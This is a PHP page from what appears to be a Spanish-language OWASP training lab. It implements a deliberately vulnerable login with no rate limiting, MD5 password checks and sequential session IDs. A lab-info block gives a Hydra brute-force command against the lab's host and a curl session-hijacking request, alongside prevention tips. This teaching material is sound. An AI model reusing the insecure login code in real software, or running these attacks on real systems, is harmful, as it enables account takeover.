<?php
/**
 * OWASP Top 10 Labs 2025 - A07: Authentication Failures
 * Módulo: Login
 * 
 * ⚠️ VULNERABLE:
 * 1. Sin rate limiting — permite brute force ilimitado
 * 2. Session ID predecible — entero secuencial
 */

session_start();
require_once __DIR__ . '/../config/db.php';

$pageTitle = 'Login - Nexo';

// Info del lab
$labInfo = [
    'id' => 'A07:2025',
    'name' => 'Authentication Failures',
    'difficulty' => 'Intermedia',
    'description' => '
        <p>Este login tiene dos problemas:</p>
        <ol>
            <li><strong>Sin rate limiting:</strong> Podés hacer brute force sin límite de intentos</li>
            <li><strong>Session ID predecible:</strong> Después de login, el session_id es un entero secuencial</li>
        </ol>
    ',
    'exploit' => '# 1. Brute force con Hydra contra la VPS:
# Usamos -t 1 para evitar falsos positivos por concurrencia/rate limit.
# Usamos Set-Cookie porque el login exitoso emite NEXO_SESS.
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 1 -f \\
  nexolab.guajilodev.com https-post-form \\
  "/a07_login/index.php:username=^USER^&password=^PASS^:S=Set-Cookie\\: NEXO_SESS="

# 2. Session hijacking:
# Después de login, tu cookie es NEXO_SESS=1006
# Probá NEXO_SESS=1001, 1002, 1003...
curl -i --cookie "NEXO_SESS=1001" \\
  https://nexolab.guajilodev.com/a07_login/dashboard.php',
    'prevention' => '// 1. Rate limiting:
if (getFailedAttempts($ip) > 5) {
    sleep(30); // o bloquear temporalmente
}

// 2. Session ID seguro:
session_regenerate_id(true);
// PHP genera ID random de 128+ bits',
    'caseStudy' => [
        'title' => 'Rockstar Games (2022)',
        'description' => 'Credential stuffing masivo sin rate limiting. Miles de cuentas comprometidas antes de detectarlo.'
    ],
    'cwes' => ['CWE-307', 'CWE-384', 'CWE-521'],
    'tools' => ['Hydra', 'Burp Suite Intruder', 'curl'],
    'secureVersion' => 'index_secure.php',
];

$error = null;
$attempts = 0;

// Contador de intentos (para mostrar que no hay límite)
if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
}

// Procesar login
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $_SESSION['login_attempts']++;
    $attempts = $_SESSION['login_attempts'];
    
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // ⚠️ VULNERABLE: Sin rate limiting
    // Un sistema seguro bloquearía después de 5 intentos fallidos
    
    try {
        $pdo = getDbConnection();
        $stmt = $pdo->prepare("SELECT id, username, password_md5, role, session_id FROM users WHERE username = ?");
        $stmt->execute([$username]);
        $user = $stmt->fetch();
        
        if ($user && $user['password_md5'] === md5($password)) {
            // Login exitoso
            
            // ⚠️ VULNERABLE: Session ID predecible (entero secuencial)
            // En lugar de regenerar con session_regenerate_id()
            $newSessionId = $user['session_id'] + 1;
            
            // Actualizar session_id en la BD
            $updateStmt = $pdo->prepare("UPDATE users SET session_id = ? WHERE id = ?");
            $updateStmt->execute([$newSessionId, $user['id']]);
            
            // Guardar en sesión y cookie
            $_SESSION['user_logged_in'] = true;
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['username'] = $user['username'];
            $_SESSION['role'] = $user['role'];
            $_SESSION['vulnerable_session_id'] = $newSessionId;
            
            // Cookie vulnerable con session ID predecible
            setcookie('NEXO_SESS', $newSessionId, time() + 3600, '/');
            
            // Reset contador
            $_SESSION['login_attempts'] = 0;
            
            header('Location: dashboard.php');
            exit;
        } else {
            $error = "Credenciales incorrectas";
            // ⚠️ VULNERABLE: No hay delay, no hay bloqueo
        }
    } catch (PDOException $e) {
        $error = "Error de base de datos";
    }
}

$attempts = $_SESSION['login_attempts'];

// Si ya está logueado, redirigir
if (isset($_SESSION['user_logged_in']) && $_SESSION['user_logged_in']) {
    header('Location: dashboard.php');
    exit;
}

include __DIR__ . '/../shared/header.php';
?>

<main class="container py-4">
    <div class="row justify-content-center">
        <div class="col-md-5">
            
            <div class="text-center mb-4">
                <h1 class="h3">🔐 Iniciar Sesión</h1>
                <p class="text-muted">Accede a tu cuenta de Nexo</p>
            </div>
            
            <!-- Contador de intentos (demuestra falta de rate limiting) -->
            <?php if ($attempts > 0): ?>
            <div class="alert <?= $attempts > 5 ? 'alert-danger' : 'alert-warning' ?>">
                <strong>Intento #<?= $attempts ?></strong>
                <?php if ($attempts > 5): ?>
                <br><small>🚨 Ya van <?= $attempts ?> intentos y el sistema no te bloqueó. Eso es un problema.</small>
                <?php endif; ?>
            </div>
            <?php endif; ?>
            
            <div class="card shadow-sm">
                <div class="card-body p-4">
                    
                    <?php if ($error): ?>
                    <div class="alert alert-danger"><?= htmlspecialchars($error) ?></div>
                    <?php endif; ?>
                    
                    <form method="POST">
                        <div class="mb-3">
                            <label for="username" class="form-label">Usuario</label>
                            <input type="text" class="form-control" id="username" name="username" 
                                   value="<?= htmlspecialchars($_POST['username'] ?? '') ?>" required>
                        </div>
                        
                        <div class="mb-3">
                            <label for="password" class="form-label">Contraseña</label>
                            <input type="password" class="form-control" id="password" name="password" required>
                        </div>
                        
                        <button type="submit" class="btn btn-primary w-100">
                            Iniciar sesión
                        </button>
                    </form>
                </div>
            </div>
            
            <div class="text-center mt-3">
                <a href="/" class="text-muted small">← Volver al inicio</a>
            </div>
            
            <!-- Pistas del lab -->
            <div class="card mt-4 border-warning">
                <div class="card-header bg-warning">
                    💡 Pistas del lab
                </div>
                <div class="card-body small">
                    <p><strong>Brute force:</strong> No hay límite de intentos. Probá con Hydra o manualmente.</p>
                    <p><strong>Usuarios conocidos:</strong></p>
                    <ul class="mb-0">
                        <li><code>alice</code> — password de A04</li>
                        <li><code>bob</code> — password de A04</li>
                        <li><code>admin</code> — password de A02</li>
                    </ul>
                </div>
            </div>
            
        </div>
    </div>
</main>

<?php 
include __DIR__ . '/../shared/lab_panel.php';
include __DIR__ . '/../shared/footer.php'; 
?>
